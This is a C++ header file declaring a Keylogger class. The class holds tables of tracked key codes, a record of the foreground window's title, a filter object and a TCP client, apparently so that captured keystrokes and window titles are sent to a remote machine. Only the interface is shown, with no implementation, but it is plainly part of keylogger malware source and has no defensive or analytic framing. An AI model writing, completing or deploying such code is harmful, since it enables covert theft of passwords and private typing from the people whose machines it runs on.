#pragma once

#include "Filtering.h"
#include "Networking.h"
#include <string>
#include <vector>


class Keylogger {
private:
	static const std::vector<int> valueKeys;
	static const std::vector<int> specialKeys;
	static const std::vector<int> numpadKeys;
	static const std::vector<int> funcKeys;
	static const std::vector<std::vector<int>> trackedKeys;

	static const std::vector<std::wstring> specialKeysNames;

	Filter* filter;
	TcpClient* client;

	HWND hLastTrackedWindow = NULL;
	bool titleUpdateRequest = false;
	std::wstring windowTitle;

public:
	Keylogger(TcpClient* client, Filter* filter);
	~Keylogger();

	void logKeys();

};